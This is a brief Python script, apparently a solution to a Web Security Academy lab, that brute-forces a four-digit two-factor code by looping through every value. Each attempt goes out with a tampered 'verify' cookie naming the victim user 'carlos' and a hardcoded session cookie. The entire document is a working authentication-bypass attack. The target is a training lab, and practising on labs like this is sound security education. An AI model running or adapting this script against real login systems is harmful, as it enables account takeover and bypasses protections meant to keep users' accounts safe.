import requests
import time

URL = 'https://ac361f171e4e40efc0bf0a53007d00e3.web-security-academy.net/'


def get_2fa_code(session):
    for number in ["%04d" % x for x in range(10000)]:
        time.sleep(0.5)
        response = requests.post(URL, cookies={'verify': "carlos", 'session': session}, data={'mfa-code': number})
        if "Incorrect security code" not in str(response.text):
            print(f"Security code is {number}")
            break


if __name__ == '__main__':
    # Modify the verify cookie to make sure that a 2FA code is sent to the victim
    session_cookie = 'ci6p0Jy442uZXF0xz7xqmdG7NJscFRiS'
    get_2fa_code(session_cookie)
